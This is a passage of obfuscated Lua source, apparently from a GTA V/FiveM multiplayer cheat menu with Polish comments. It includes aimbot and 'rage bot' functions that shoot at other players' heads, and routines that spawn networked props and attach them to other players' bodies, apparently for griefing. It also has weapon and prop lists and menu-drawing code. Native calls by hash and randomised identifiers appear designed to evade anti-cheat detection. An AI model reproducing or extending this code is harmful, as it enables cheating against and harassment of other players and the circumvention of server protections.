                            x_DSUHGISDG = -10.4,
                            y_DSUHGISDG = 0.0,
                            z_DSIHGSDGDSSDUHI = 11.6 + (2.6 * (i_SDGUIHSDUGSD + 1)),
                            _p_SDDSIHUGISDGSD = 90.0,
                            _y_SDDSIHUGISDGSD = 0.0,
                            _r_DSIGUHUSDIGSD = 0.0
                        }
                    end

                    local positions_DSIGHISDGSDG = {column_SJGHISDUGSDDSG["up"], column_SJGHISDUGSDDSG["across"], arms_DSIGJSDGSDG["bottom_right"], arms_DSIGJSDGSDG["across_up"], arms_DSIGJSDGSDG["top_left"], arms_DSIGJSDGSDG["across_down"]}
                    RequestModelSync_SDUFHSIDGSDG("prop_container_05a")

                    for _DSGISUDGSD, seg_SDGSDJKGSDG in pairs(positions_DSIGHISDGSDG) do
                        for _DSGISUDGSD, v_SDIGJOSDGSD in pairs(seg_SDGSDJKGSDG) do
                           local obj_DSUHGISDUGSDG = sritizen_INVOKE_PN(0x509D5878EB39E842, sritizen_INVOKE_PN(0xD24D37CC275948CC, "prop_container_05a"), where_DSUGHSIDUGSDG.x, where_DSUGHSIDUGSDG.y, where_DSUGHSIDUGSDG.z + (offZ_SDGUSDIGSD or 0), true, true, true)
                            DoNetwork_DSIGHISUDGSDG(obj_DSUHGISDUGSDG)
                            sritizen_INVOKE_PN(0x6B9BBD38AB0796DF, obj_DSUHGISDUGSDG, ent_DSIUHGIUSDGDS, sritizen_INVOKE_PN(0x524AC5ECEA15343E, ent_DSIUHGIUSDGDS) and GetPedBoneIndex_PN_DSGIHSDGSDG(ped_jgtirgirtjhilrthrth, 57005) or 0, v_SDIGJOSDGSD.x_DSUHGISDG, v_SDIGJOSDGSD.y_DSUHGISDG, v_SDIGJOSDGSD.z_DSIHGSDGDSSDUHI + (offZ_SDGUSDIGSD or 0), v_SDIGJOSDGSD._p_SDDSIHUGISDGSD, v_SDIGJOSDGSD._y_SDDSIHUGISDGSD, v_SDIGJOSDGSD._r_DSIGUHUSDIGSD, false, true, false, false, 1, true)
                            PN_WAIT_31DA31_PN(80)
                        end
                    end
                end)
            end
			
 local function DICKWTWOJEJMORDZIE31DA_PN(ent_ghjeruihtjrtrklh)

                CreateThreadNowAtomicDrugMiSsie_DIASFUOIDSGSDFG(function()
                    local manyCoTuSieRobi = GetOffsetFromEntityInWorldCoords_PN_UHDIUGHDFUGHDFG(ent_ghjeruihtjrtrklh, 0.0, 0.0, 0.0)

                    if not IsEntityAPed(ent_ghjeruihtjrtrklh) then
                        manyCoTuSieRobi = vector3(manyCoTuSieRobi.x, manyCoTuSieRobi.y, manyCoTuSieRobi.z + 5.0)
                    end

                    RequestModelSync_SDUFHSIDGSDG("stt_prop_stunt_bowling_ball")
                    local ball_l_KGKGKGKRGKR = sritizen_INVOKE_PN(0x509D5878EB39E842, sritizen_INVOKE_PN(0xD24D37CC275948CC, "stt_prop_stunt_bowling_ball"), manyCoTuSieRobi.x, manyCoTuSieRobi.y, manyCoTuSieRobi.z, true, true, true)
                    DoNetwork_DSIGHISUDGSDG(ball_l_KGKGKGKRGKR)
                    sritizen_INVOKE_PN(0x6B9BBD38AB0796DF, ball_l_KGKGKGKRGKR, ent_ghjeruihtjrtrklh, IsEntityAPed(ent_ghjeruihtjrtrklh) and GetPedBoneIndex(ped_jgtirgirtjhilrthrth, 57005) or 0, -3.0, 0, 0.0, 0.0, 0.0, 180.0, false, true, false, false, 1, true)
                    Wait(50)
                    local ball_r_JIKRIGERGHTUI = sritizen_INVOKE_PN(0x509D5878EB39E842, sritizen_INVOKE_PN(0xD24D37CC275948CC, "stt_prop_stunt_bowling_ball"), manyCoTuSieRobi.x, manyCoTuSieRobi.y, manyCoTuSieRobi.z, true, true, true)
                    DoNetwork_DSIGHISUDGSDG(ball_r_JIKRIGERGHTUI)
                    sritizen_INVOKE_PN(0x6B9BBD38AB0796DF, ball_r_JIKRIGERGHTUI, ent_ghjeruihtjrtrklh, IsEntityAPed(ent_ghjeruihtjrtrklh) and GetPedBoneIndex(ped_jgtirgirtjhilrthrth, 57005) or 0, 3.0, 0, 0.0, 0.0, 0.0, 0.0, false, true, false, false, 1, true)
                    Wait(50)
                    local shaft_FKRJGJRGJR = sritizen_INVOKE_PN(0x509D5878EB39E842, sritizen_INVOKE_PN(0xD24D37CC275948CC, "prop_container_ld2"), manyCoTuSieRobi.x, manyCoTuSieRobi.y, manyCoTuSieRobi.z, true, true, true)
                    DoNetwork_DSIGHISUDGSDG(shaft_FKRJGJRGJR)
                    sritizen_INVOKE_PN(0x6B9BBD38AB0796DF, shaft_FKRJGJRGJR, ent_ghjeruihtjrtrklh, IsEntityAPed(ent_ghjeruihtjrtrklh) and GetPedBoneIndex(ped_jgtirgirtjhilrthrth, 57005) or 0, -1.5, 0, 5.0, 90.0, 0, 90.0, false, true, false, false, 1, true)
                    Wait(50)
                end)
            end
			

local function AddVectors_PN_DUHFIUDSHGFDG(to_vector_1_IDUHGISJGFDG, to_vector_2_DOIHGIUOSDGRF)
return vector3(to_vector_1_IDUHGISJGFDG.x + to_vector_2_DOIHGIUOSDGRF.x, to_vector_1_IDUHGISJGFDG.y + to_vector_2_DOIHGIUOSDGRF.y, to_vector_1_IDUHGISJGFDG.z + to_vector_2_DOIHGIUOSDGRF.z)
end

local shooted_DSUGHUDSGSD = false

local function aimbot_shoot_SUGUYFSDHIFDG(target_udhsgidgsdfg, bone_udhgsiugsdfgsre, damage_dighsdiugsdfgr)
if shooted_DSUGHUDSGSD then
-- nic
else
		local boneTarget_UDHGIHDUFIURDFG = GetPedBoneCoords_PN_GDUYFSDGF(target_udhsgidgsdfg, GetEntityBoneIndexByName(target_udhsgidgsdfg, "SKEL_HEAD"), 0.0, 0.0, 0.0)
		local _, weapon_IDHIFUSDGFDG = GetCurrentPedWeapon_PN_UDIUGHUSGFD(sritizen_INVOKE_PN(0xD80958FC74E988A6))
		sritizen_INVOKE_PN(0x867654CBC7606F2C, AddVectors_PN_DUHFIUDSHGFDG(boneTarget_UDHGIHDUFIURDFG, vector3(0, 0, 0.1)), boneTarget_UDHGIHDUFIURDFG, damage_dighsdiugsdfgr, true, weapon_IDHIFUSDGFDG, sritizen_INVOKE_PN(0xD80958FC74E988A6), true, true, 1000.0)
		shooted_DSUGHUDSGSD = true
		PN_WAIT_31DA31_PN(500)
		shooted_DSUGHUDSGSD = false
	end
end

local function rage_bot_shoot_SUGUYFSDHIFDG(target_udhsgidgsdfg, bone_udhgsiugsdfgsre, damage_dighsdiugsdfgr)
    local boneTarget_UDHGIHDUFIURDFG = GetPedBoneCoords_PN_GDUYFSDGF(target_udhsgidgsdfg, GetEntityBoneIndexByName(target_udhsgidgsdfg, "SKEL_HEAD"), 0.0, 0.0, 0.0)
    local _, weapon_IDHIFUSDGFDG = GetCurrentPedWeapon_PN_UDIUGHUSGFD(sritizen_INVOKE_PN(0xD80958FC74E988A6))
    sritizen_INVOKE_PN(0x867654CBC7606F2C, AddVectors_PN_DUHFIUDSHGFDG(boneTarget_UDHGIHDUFIURDFG, vector3(0, 0, 0.1)), boneTarget_UDHGIHDUFIURDFG, damage_dighsdiugsdfgr, true, weapon_IDHIFUSDGFDG, sritizen_INVOKE_PN(0xD80958FC74E988A6), true, true, 1000.0)
end

local function legit_aimbot_UGDUYFHDSIGKHUIDFGDFG(player_duhfiudshgisdf)
    if sritizen_INVOKE_PN(0xE659E47AF827484B, player_duhfiudshgisdf) and not sritizen_INVOKE_PN(0x3317DEDB88C95038, player_duhfiudshgisdf) and sritizen_INVOKE_PN(0xE2587F8CBBD87B1D, 0, 24) and sritizen_INVOKE_PN(0xE2587F8CBBD87B1D, 0, 19) and sritizen_INVOKE_PN(0x2E397FD2ECD37C87, sritizen_INVOKE_PN(0x4F8644AF03D0E0D6)) then
        local x_dgjodisgpdsfg, y_diughodsgdsfg, z_duhgaufydshigsdfg = table.unpack(GetEntityCoords_PN_UDHGIUDIKGDFG(player_duhfiudshgisdf))
        local _, _x_ADIFJIDSGJDSIGISDGSD, _y_SDDSIHUGISDGSD = World3dToScreen2d_PN_UDHUGIDFGDF(x_dgjodisgpdsfg, y_diughodsgdsfg, z_duhgaufydshigsdfg)
        if _x_ADIFJIDSGJDSIGISDGSD > fov_x_DISFISDUSGFDG and _x_ADIFJIDSGJDSIGISDGSD < fov_x2_DISFISDUSGFDG and _y_SDDSIHUGISDGSD > fov_y_DISFISDUSGFDG and _y_SDDSIHUGISDGSD < fov_y2_DISFISDUSGFDG then
            local _, weapon_IDHIFUSDGFDG = GetCurrentPedWeapon_PN_UDIUGHUSGFD(sritizen_INVOKE_PN(0xD80958FC74E988A6))
            aimbot_shoot_SUGUYFSDHIFDG(player_duhfiudshgisdf, "", GetWeaponDamage_PN_SDGHSDUGDS(weapon_IDHIFUSDGFDG, 1))
        end
    end
end

local function rage_bot_UGDUYFHDSIGKHUIDFGDFG(player_duhfiudshgisdf)
    if not sritizen_INVOKE_PN(0x3317DEDB88C95038, player_duhfiudshgisdf) then
        local x_dgjodisgpdsfg, y_diughodsgdsfg, z_duhgaufydshigsdfg = table.unpack(GetEntityCoords_PN_UDHGIUDIKGDFG(player_duhfiudshgisdf))
        local _, _x_ADIFJIDSGJDSIGISDGSD, _y_SDDSIHUGISDGSD = World3dToScreen2d_PN_UDHUGIDFGDF(x_dgjodisgpdsfg, y_diughodsgdsfg, z_duhgaufydshigsdfg)
        if _x_ADIFJIDSGJDSIGISDGSD > fov_x_DISFISDUSGFDG and _x_ADIFJIDSGJDSIGISDGSD < fov_x2_DISFISDUSGFDG and _y_SDDSIHUGISDGSD > fov_y_DISFISDUSGFDG and _y_SDDSIHUGISDGSD < fov_y2_DISFISDUSGFDG then
            local _, weapon_IDHIFUSDGFDG = GetCurrentPedWeapon_PN_UDIUGHUSGFD(sritizen_INVOKE_PN(0xD80958FC74E988A6))
            rage_bot_shoot_SUGUYFSDHIFDG(player_duhfiudshgisdf, "", GetWeaponDamage_PN_SDGHSDUGDS(weapon_IDHIFUSDGFDG, 1))
        end
    end
end

local function RandomOutfit_PN_HAHERHGKDHFUFDHSGIUHDFIGDF()
    local Co_to_te_uGEHTHRT_lol = sritizen_INVOKE_PN(0x43A66C31C68491C0, -1)
    sritizen_INVOKE_PN(0xC8A9481A01E63C28, Co_to_te_uGEHTHRT_lol, false)
    sritizen_INVOKE_PN(0xC44AA05345C992C6, Co_to_te_uGEHTHRT_lol)
end

-- Zmienne globalne

local menus_ueygtyuerihgkbergerg = { }

local keys_dhgiuerhgoelgiehwgewg = { up_key_dhugiuerger = 188, down_key_dhugiuerger = 187, left_key_dhugiuerger = 189, right_key_dhugiuerger = 190, select_key_dhugiuerger = 201, back_key_dhugiuerger = 202 }

local optionCount_eygfuwengjiebigoer = 0

-- CurrentKey i_HUGHUTKHJTRHRTH CurrentMenu (Nie zmieniaj nic tyle ci wystarczy xd)
local currentKey_hgiuerhiogewger = nil
local currentMenu_dygfuyeikesrgerg = nil
---------------------------------------------------------------------------------------

-- Zmienne do title (wysokość itp)
local titleHeight_iudygiuehoguergerg = 0.11
local titleYOffset_rwe6rqtyhfiehguerwg = 0.03
local titleScale_diufiegergnergewg = 1.0
---------------------------------------------------------------------------------------

-- Zmienne do buttonów (wysokośc itp)
local buttonHeight_polcijahugiueshrguerlge = 0.028
local buttonFont_poidofjeughoeigienwir = 4
local buttonScale_kurwamissclick_ghrueghrekrkeu = 0.305
local buttonTextXOffset_ydtfuewkhjbeisoger = 0.005
local buttonTextYOffset_ydtufebklergegew = 0.005
---------------------------------------------------------------------------------------

local Wlaczone_PN_MENU_E1QDA_XD = true -- Czy menu jest włączone

local discordPresence_YFGUIFSFEWYKUFYDSFF = false

local watermark_1587_PN = true

spectate_global_dugsuydhkgsdfgdf = false

-- Wszystkie bronie
local ALLWEAPONSY_PN = {
    "PISTOL",
    "PISTOL_MK2",
    "COMBATPISTOL",
    "APPISTOL",
    "REVOLVER",
    "REVOLVER_MK2",
    "DOUBLEACTION",
    "PISTOL50",
    "SNSPISTOL",
    "SNSPISTOL_MK2",
    "HEAVYPISTOL",
    "VINTAGEPISTOL",
    "STUNGUN",
    "FLAREGUN",
    "MARKSMANPISTOL",
    "KNIFE",
    "KNUCKLE",
    "NIGHTSTICK",
    "HAMMER",
    "BAT",
    "GOLFCLUB",
    "CROWBAR",
    "BOTTLE",
    "DAGGER",
    "HATCHET",
    "MACHETE",
    "FLASHLIGHT",
    "SWITCHBLADE",
    "POOLCUE",
    "PIPEWRENCH",
    "MICROSMG",
    "MINISMG",
    "SMG",
    "SMG_MK2",
    "ASSAULTSMG",
    "COMBATPDW",
    "GUSENBERG",
    "MACHINEPISTOL",
    "MG",
    "COMBATMG",
    "COMBATMG_MK2",
    "ASSAULTRIFLE",
    "ASSAULTRIFLE_MK2",
    "CARBINERIFLE",
    "CARBINERIFLE_MK2",
    "ADVANCEDRIFLE",
    "SPECIALCARBINE",
    "SPECIALCARBINE_MK2",
    "BULLPUPRIFLE",
    "BULLPUPRIFLE_MK2",
    "COMPACTRIFLE",
    "PUMPSHOTGUN",
    "PUMPSHOTGUN_MK2",
    "SWEEPERSHOTGUN",
    "SAWNOFFSHOTGUN",
    "BULLPUPSHOTGUN",
    "ASSAULTSHOTGUN",
    "MUSKET",
    "HEAVYSHOTGUN",
    "DBSHOTGUN",
    "SNIPERRIFLE",
    "HEAVYSNIPER",
    "HEAVYSNIPER_MK2",
    "MARKSMANRIFLE",
    "MARKSMANRIFLE_MK2",
    "GRENADELAUNCHER",
    "GRENADELAUNCHER_SMOKE",
    "RPG",
    "MINIGUN",
    "FIREWORK",
    "RAILGUN",
    "HOMINGLAUNCHER",
    "COMPACTLAUNCHER",
    "GRENADE",
    "STICKYBOMB",
    "PROXMINE",
    "BZGAS",
    "SMOKEGRENADE",
    "MOLOTOV",
    "FIREEXTINGUISHER",
    "PETROLCAN",
    "SNOWBALL",
    "FLARE",
    "BALL"
}
---------------------------------------------------------------------------------------

-- Wszystkie propy
local props_IDHSOGLFDSKGDUHIOSSD = {
"hei_prop_carrier_radar_1",
"hei_prop_carrier_defense_02",
"hei_prop_mini_sever_02",
"hei_prop_ss1_mpint_door_l",
"lts_prop_lts_elecbox_24",
"lts_prop_lts_elecbox_24b",
"p_armchair_01_s",
"p_beefsplitter_s",
"p_cablecar_s",
"p_crahsed_heli_s",
"p_cs_mp_jet_01_s",
"p_gate_prison_01_s",
"vp_ld_coffee_vend_01",
"p_lestersbed_s",
"p_lev_sofa_s",
"p_med_jet_01_s",
"p_mbbed_s",
"p_new_j_counter_03",
"p_oil_pjack_02_s",
"p_oil_pjack_03_s",
"p_tram_crash_s",
"p_v_med_p_sofa_s",
"p_v_res_tt_bed_s",
"prop_barrel_pile_01",
"prop_air_generator_03",
"prop_air_sechut_01",
"prop_aircon_l_01",
"prop_aircon_m_10",
"prop_aircon_tna_02",
"prop_asteroid_01",
"prop_barier_conc_05c",
"prop_barrel_pile_01",
"prop_bbq_3",
"prop_bench_03",
"prop_bh1_09_mp_gar",
"prop_big_cin_screen",
"prop_biolab_g_door",
"prop_bleachers_05_cr",
"prop_bmu_02_ld",
"prop_box_wood04a",
"prop_boxpile_02b",
"prop_boxpile_07a",
"prop_bumper_04",
"prop_bush_lrg_01e_cr2",
"prop_bush_lrg_01c_cr",
"prop_busstop_04",
"prop_byard_dingy",
"prop_byard_floatpile",
"prop_byard_rowboat1",
"prop_cablespool_03",
"prop_car_battery_01",
"prop_cash_crate_01",
"prop_cctv_unit_01",
"prop_cementbags01",
"prop_ch2_05d_g_door",
"prop_cleaning_trolly",
"prop_coffin_01",
"prop_coffin_02b",
"prop_com_gar_door_01",
"prop_com_ls_door_01"
}

local props_one_DSUHGIUDSGSDG = {
["Radar"] = "hei_prop_carrier_radar_1",
["Defense Carrier"] = "hei_prop_carrier_defense_02",
["Mini Server"] = "hei_prop_mini_sever_02",
["Gate"] = "hei_prop_ss1_mpint_door_l",
["Gate (2)"] = "prop_bh1_09_mp_gar",
["Gate (3)"] = "prop_biolab_g_door",
["Electric Box"] = "lts_prop_lts_elecbox_24",
["Electric Box (2)"] = "lts_prop_lts_elecbox_24b",
["Armchair"] = "p_armchair_01_s",
["Beef Spliter"] = "p_beefsplitter_s",
["Cable Car"] = "p_cablecar_s",
["Crashed Helicopter"] = "p_crahsed_heli_s",
["Plane"] = "p_cs_mp_jet_01_s",
["Plane (2)"] = "p_med_jet_01_s",
["Prison Gate"] = "p_gate_prison_01_s",
["Coffe Vend"] = "p_ld_coffee_vend_01",
["Lester bed"] = "p_lestersbed_s",
["Sofa"] = "p_lev_sofa_s",
["Sofa (2)"] = "p_v_med_p_sofa_s",
["Bed"] = "p_mbbed_s",
["Bed (2)"] = "p_v_res_tt_bed_s",
["Jewerly Counter"] = "p_new_j_counter_03",
["Oil Machine"] = "p_oil_pjack_02_s",
["Oil Machine (2)"] = "p_oil_pjack_03_s",
["Tram Crashed"] = "p_tram_crash_s",
["Barrels"] = "prop_barrel_pile_01",
["Security Room"] = "prop_air_sechut_01",
["Asteroid"] = "prop_asteroid_01",
["Barier"] = "prop_barier_conc_05c",
["Bench"] = "prop_bench_03",
["Big Screen"] = "prop_big_cin_screen",
["Wood Box"] = "prop_box_wood04a",
["Bush"] = "prop_bush_lrg_01e_cr2",
["Bush (2)"] = "prop_bush_lrg_01c_cr",
["Bus Stop"] = "prop_busstop_04",
["Cash Crate"] = "prop_cash_crate_01",
["Cement Bags"] = "prop_cementbags01"
}

local flags_DHDSIUHGIUSDHGSD = {
["Canada"] = "prop_flag_canada",
["Europe"] = "prop_flag_eu",
["France"] = "prop_flag_france",
["Germany"] = "prop_flag_german",
["Ireland"] = "prop_flag_ireland",
["Japan"] = "prop_flag_japan",
["Los Santos"] = "prop_flag_ls",
["L.S.F.D"] = "prop_flag_lsfd",
["Los Santos Services"] = "prop_flag_lsservices",
["Mexico"] = "prop_flag_mexico",
["Russia"] = "prop_flag_russia",
["S.A"] = "prop_flag_sa",
["S.A.P.D"] = "prop_flag_sapd",
["Scotland"] = "prop_flag_scotland",
["Sheriff"] = "prop_flag_sheriff",
["United Kingdom"] = "prop_flag_uk",
["United States"] = "prop_flag_us",
["Golf"] = "prop_golfflag"
}

---------------------------------------------------------------------------------------



-- Podstawa --
local function setMenuProperty_dytfeiuwbguiesogdfg(id_jdhgisrejolger, property_duhgiusdrlgssd, value_dkjgisoedfg)
	if id_jdhgisrejolger and menus_ueygtyuerihgkbergerg[id_jdhgisrejolger] then
		menus_ueygtyuerihgkbergerg[id_jdhgisrejolger][property_duhgiusdrlgssd] = value_dkjgisoedfg
	end
end


local function isMenuVisible_trdyugfwgewiubfbeierg(id_jdhgisrejolger)
	if id_jdhgisrejolger and menus_ueygtyuerihgkbergerg[id_jdhgisrejolger] then
		return menus_ueygtyuerihgkbergerg[id_jdhgisrejolger].visible_udhgiusodlgesdf
	else
		return false
	end
end


local function setMenuVisible_eqwreqtyhfioewjfiuewg(id_jdhgisrejolger, visible_udhgiusodlgesdf, holdCurrent_duhgsiolgesdfg)
	if id_jdhgisrejolger and menus_ueygtyuerihgkbergerg[id_jdhgisrejolger] then
		setMenuProperty_dytfeiuwbguiesogdfg(id_jdhgisrejolger, 'visible_udhgiusodlgesdf', visible_udhgiusodlgesdf)

		if not holdCurrent_duhgsiolgesdfg and menus_ueygtyuerihgkbergerg[id_jdhgisrejolger] then
			setMenuProperty_dytfeiuwbguiesogdfg(id_jdhgisrejolger, 'currentOption_duhfislerjgilsedfg', 1)
		end

		if visible_udhgiusodlgesdf then
			if id_jdhgisrejolger ~= currentMenu_dygfuyeikesrgerg and isMenuVisible_trdyugfwgewiubfbeierg(currentMenu_dygfuyeikesrgerg) then
				setMenuVisible_eqwreqtyhfioewjfiuewg(currentMenu_dygfuyeikesrgerg, false)
			end

			currentMenu_dygfuyeikesrgerg = id_jdhgisrejolger
		end
	end
end


local function drawText_udgyuiergeirgeg(text_duhgilserg, x_dhgiuslergssdfg, y_dhgiuslergssdfg, font_ifhgiuslrgsdfg, color_fjgoisrgdfg, scale_digjiusjeriogsfg, center_dhgusirdfg, shadow_dhugiusergsdfg, alignRight_76497tjiosdfjgsregdsf)
	sritizen_INVOKE_PN(0xBE6B23FFA53FB442, color_fjgoisrgdfg.r_djguisernglse, color_fjgoisrgdfg.g_IDJGIODSF, color_fjgoisrgdfg.b_djguisernglse, color_fjgoisrgdfg.a_djguisernglse)
	sritizen_INVOKE_PN(0x66E0276CC5F6B9DA, font_ifhgiuslrgsdfg)
	sritizen_INVOKE_PN(0x07C837F9A01C34C9, scale_digjiusjeriogsfg, scale_digjiusjeriogsfg)

	if shadow_dhugiusergsdfg then
		sritizen_INVOKE_PN(0x465C84BC39F1C351, 2, 2, 0, 0, 0)
	end

	local menu_idhgisjlofdgsersdfgsegdf = menus_ueygtyuerihgkbergerg[currentMenu_dygfuyeikesrgerg]
	if menu_idhgisjlofdgsersdfgsegdf then
		if center_dhgusirdfg then
			sritizen_INVOKE_PN(0xC02F4DBFB51D988B, center_dhgusirdfg)
		elseif alignRight_76497tjiosdfjgsregdsf then
			sritizen_INVOKE_PN(0x63145D9C883A1A70, menu_idhgisjlofdgsersdfgsegdf.x_dhgiuslergssdfg, menu_idhgisjlofdgsersdfgsegdf.x_dhgiuslergssdfg + menu_idhgisjlofdgsersdfgsegdf.width_duhgsiuerlgsdf - buttonTextXOffset_ydtfuewkhjbeisoger)
			sritizen_INVOKE_PN(0x6B3C4650BC8BEE47, true)
		end
	end

	sritizen_INVOKE_PN(0x25FBB336DF1804CB, "STRING")
	sritizen_INVOKE_PN(0x94CF4AC034C9C986, tostring(text_duhgilserg))
	sritizen_INVOKE_PN(0xCD015E5BB0D96A57, x_dhgiuslergssdfg, y_dhgiuslergssdfg)
end

local function drawRect_ytfuewgifygbkinbguyierlgeg(x_dhgiuslergssdfg, y_dhgiuslergssdfg, width_duhgsiuerlgsdf, height_dihguisgdgdf, color_fjgoisrgdfg)
	sritizen_INVOKE_PN(0x3A618A217E5154F0, x_dhgiuslergssdfg, y_dhgiuslergssdfg, width_duhgsiuerlgsdf, height_dihguisgdgdf, color_fjgoisrgdfg.r_djguisernglse, color_fjgoisrgdfg.g_IDJGIODSF, color_fjgoisrgdfg.b_djguisernglse, color_fjgoisrgdfg.a_djguisernglse)
end

local function DrawTxt_fsd7g8reuigsdf(text_dughisergdfdg, x_dygs8dfuijgk4, y_duhg8suoeirg, scale_f8ghsiupoged, size_duyg87seruigsd)
    sritizen_INVOKE_PN(0x66E0276CC5F6B9DA, 0)
    sritizen_INVOKE_PN(0x038C1F517D7FDCF8, 1)
    sritizen_INVOKE_PN(0x07C837F9A01C34C9, scale_f8ghsiupoged, size_duyg87seruigsd)
    sritizen_INVOKE_PN(0x465C84BC39F1C351, 1, 0, 0, 0, 255)
    sritizen_INVOKE_PN(0x441603240D202FA6, 1, 0, 0, 0, 255)
    sritizen_INVOKE_PN(0x1CA3E9EAC9D93E5E)
    sritizen_INVOKE_PN(0x2513DFB0FB8400FE) 
    sritizen_INVOKE_PN(0x25FBB336DF1804CB, "STRING")
    sritizen_INVOKE_PN(0x94CF4AC034C9C986, text_dughisergdfdg)
    sritizen_INVOKE_PN(0xCD015E5BB0D96A57, x_dygs8dfuijgk4, y_duhg8suoeirg)
end

local function drawTitle_ufhgiuehgunesiough()
	local menu_idhgisjlofdgsersdfgsegdf = menus_ueygtyuerihgkbergerg[currentMenu_dygfuyeikesrgerg]
	if menu_idhgisjlofdgsersdfgsegdf then
		local x = menu_idhgisjlofdgsersdfgsegdf.x_dhgiuslergssdfg + menu_idhgisjlofdgsersdfgsegdf.width_duhgsiuerlgsdf / 2
		local y = menu_idhgisjlofdgsersdfgsegdf.y_dhgiuslergssdfg + titleHeight_iudygiuehoguergerg / 2

		if menu_idhgisjlofdgsersdfgsegdf.titleBackgroundSprite_udyguiosrser3445r3 then
			sritizen_INVOKE_PN(0xE7FFAE5EBF23D890, menu_idhgisjlofdgsersdfgsegdf.titleBackgroundSprite_udyguiosrser3445r3.dict_jdhgiusrjlger, menu_idhgisjlofdgsersdfgsegdf.titleBackgroundSprite_udyguiosrser3445r3.name_idgjiserjios, x, y, menu_idhgisjlofdgsersdfgsegdf.width_duhgsiuerlgsdf, titleHeight_iudygiuehoguergerg, 0., 255, 255, 255, 255)
		else
			drawRect_ytfuewgifygbkinbguyierlgeg(x, y, menu_idhgisjlofdgsersdfgsegdf.width_duhgsiuerlgsdf, titleHeight_iudygiuehoguergerg, menu_idhgisjlofdgsersdfgsegdf.titleBackgroundColor_7567fihfsudgdsf)
		end

		drawText_udgyuiergeirgeg(menu_idhgisjlofdgsersdfgsegdf.title_duhgilgsegdfg, x, y - titleHeight_iudygiuehoguergerg / 2 + titleYOffset_rwe6rqtyhfiehguerwg, menu_idhgisjlofdgsersdfgsegdf.titleFont_dnguseridf, menu_idhgisjlofdgsersdfgsegdf.titleColor_diuhgauesd, titleScale_diufiegergnergewg, true)
	end
end


local function drawSubTitle_ydtufgekhbghskdnlgjrnei()
	local menu_idhgisjlofdgsersdfgsegdf = menus_ueygtyuerihgkbergerg[currentMenu_dygfuyeikesrgerg]
	if menu_idhgisjlofdgsersdfgsegdf then
		local x_dhgiuslergssdfg = menu_idhgisjlofdgsersdfgsegdf.x_dhgiuslergssdfg + menu_idhgisjlofdgsersdfgsegdf.width_duhgsiuerlgsdf / 2
		local y_dhgiuslergssdfg = menu_idhgisjlofdgsersdfgsegdf.y_dhgiuslergssdfg + titleHeight_iudygiuehoguergerg + buttonHeight_polcijahugiueshrguerlge / 2

		local subTitleColor_dihgiusergsdfg = { r_djguisernglse = menu_idhgisjlofdgsersdfgsegdf.titleBackgroundColor_7567fihfsudgdsf.r_djguisernglse, g_IDJGIODSF = menu_idhgisjlofdgsersdfgsegdf.titleBackgroundColor_7567fihfsudgdsf.g_IDJGIODSF, b_djguisernglse = menu_idhgisjlofdgsersdfgsegdf.titleBackgroundColor_7567fihfsudgdsf.b_djguisernglse, a_djguisernglse = 255 }

		drawRect_ytfuewgifygbkinbguyierlgeg(x_dhgiuslergssdfg, y_dhgiuslergssdfg, menu_idhgisjlofdgsersdfgsegdf.width_duhgsiuerlgsdf, buttonHeight_polcijahugiueshrguerlge, menu_idhgisjlofdgsersdfgsegdf.subTitleBackgroundColor_duhgsiuorsgsdf)
		drawText_udgyuiergeirgeg(menu_idhgisjlofdgsersdfgsegdf.subTitle_duhgiuesrjogse, menu_idhgisjlofdgsersdfgsegdf.x_dhgiuslergssdfg-0.003 + buttonTextXOffset_ydtfuewkhjbeisoger, y_dhgiuslergssdfg+0.003 - buttonHeight_polcijahugiueshrguerlge / 2 + buttonTextYOffset_ydtufebklergegew - 0.005, buttonFont_poidofjeughoeigienwir, subTitleColor_dihgiusergsdfg, buttonScale_kurwamissclick_ghrueghrekrkeu, false)

		if optionCount_eygfuwengjiebigoer > menu_idhgisjlofdgsersdfgsegdf.maxOptionCount_djgiusriuogsedsfg then
			drawText_udgyuiergeirgeg(tostring(menu_idhgisjlofdgsersdfgsegdf.currentOption_duhfislerjgilsedfg)..'/ '..tostring(optionCount_eygfuwengjiebigoer), menu_idhgisjlofdgsersdfgsegdf.x_dhgiuslergssdfg + menu_idhgisjlofdgsersdfgsegdf.width_duhgsiuerlgsdf, y_dhgiuslergssdfg - buttonHeight_polcijahugiueshrguerlge / 2 + buttonTextYOffset_ydtufebklergegew, buttonFont_poidofjeughoeigienwir, subTitleColor_dihgiusergsdfg, buttonScale_kurwamissclick_ghrueghrekrkeu, false, false, true)
		end
	end
end

local txtRatio_DSHGDSIUGSDG = {}
local ratio_DSGIHSDIUGSDG = GetAspectRatio_PN_DSHUGHSIDG(true)
local mult_DSGHSDUIGSDG = 10^3

local function DrawSpriteScaled_DSGIDSIUGISDGDS(textureDict_SDGHSIUDGSDG, textureName_DSGUHSDUGHIUDS, screenX_DSGUHSDUIGSDG, screenY_SDGHDSIGSDG, width_SDIGHSUIDGSDG, height_SDGHDSIUGSDG, heading, red, green, blue, alpha)
    local index_DSGUHISUDGSD = tostring(textureName_DSGUHSDUGHIUDS)

    if not txtRatio_DSHGDSIUGSDG[index_DSGUHISUDGSD] then
        txtRatio_DSHGDSIUGSDG[index_DSGUHISUDGSD] = {}
        local res_DSUGHSDIUGSDG = GetTextureResolution_PN_SDIGSIDJGIDS(textureDict_SDGHSIUDGSDG, textureName_DSGUHSDUGHIUDS)

        txtRatio_DSHGDSIUGSDG[index_DSGUHISUDGSD].ratio_DSGIHSDIUGSDG = (res_DSUGHSDIUGSDG[2] / res_DSUGHSDIUGSDG[1])
        txtRatio_DSHGDSIUGSDG[index_DSGUHISUDGSD].height_SDGHDSIUGSDG = math.floor(((width_SDIGHSUIDGSDG * txtRatio_DSHGDSIUGSDG[index_DSGUHISUDGSD].ratio_DSGIHSDIUGSDG) * ratio_DSGIHSDIUGSDG) * mult_DSGHSDUIGSDG + 0.5) / mult_DSGHSDUIGSDG
        sritizen_INVOKE_PN(0xE7FFAE5EBF23D890, textureDict_SDGHSIUDGSDG, textureName_DSGUHSDUGHIUDS, screenX_DSGUHSDUIGSDG, screenY_SDGHDSIGSDG, width_SDIGHSUIDGSDG, txtRatio_DSHGDSIUGSDG[index_DSGUHISUDGSD].height_SDGHDSIUGSDG, heading, red, green, blue, alpha)
    end

    sritizen_INVOKE_PN(0xE7FFAE5EBF23D890, textureDict_SDGHSIUDGSDG, textureName_DSGUHSDUGHIUDS, screenX_DSGUHSDUIGSDG, screenY_SDGHDSIGSDG, width_SDIGHSUIDGSDG, txtRatio_DSHGDSIUGSDG[index_DSGUHISUDGSD].height_SDGHDSIUGSDG, heading, red, green, blue, alpha)
end


